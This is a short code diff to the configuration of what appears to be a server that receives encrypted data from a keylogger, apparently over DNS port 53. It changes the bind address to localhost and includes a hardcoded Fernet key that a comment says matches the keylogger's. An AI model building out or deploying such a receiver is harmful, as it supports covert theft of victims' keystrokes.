@@ -7,7 +7,7 @@ logging.basicConfig(filename='server.log', level=logging.DEBUG,
                     format='%(asctime)s - %(levelname)s - %(message)s')
 
 # Configuration
-SERVER_ADDRESS = ('0.0.0.0', 53)
+SERVER_ADDRESS = ('127.0.0.1', 53)
 # Replace with the same key used in the keylogger
 ENCRYPTION_KEY = 'b-cAg-xe8OS8kIn1FU-_g1vzwfCvOEzPIrHbMNLA_CI='
 cipher = Fernet(ENCRYPTION_KEY)
